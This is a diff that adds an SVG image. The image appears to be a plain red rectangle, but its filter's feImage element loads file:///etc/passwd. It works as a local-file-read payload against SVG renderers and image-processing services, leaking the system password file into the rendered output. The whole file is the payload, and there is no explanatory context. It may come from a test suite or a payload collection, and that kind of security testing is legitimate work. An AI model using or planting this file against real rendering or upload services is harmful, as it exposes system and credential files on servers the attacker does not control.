@@ -1,0 +1,10 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="400">
+  <defs>
+    <filter id="blend_filter" x="0" y="0" width="100%" height="100%">
+      <feImage xlink:href="file:///etc/passwd" result="file_content"/>
+      <feBlend in="SourceGraphic" in2="file_content" mode="multiply" result="blended"/>
+      <feComposite in="blended" in2="SourceGraphic" operator="atop"/>
+    </filter>
+  </defs>
+  <rect width="400" height="400" fill="red" filter="url(#blend_filter)"/>
+</svg>
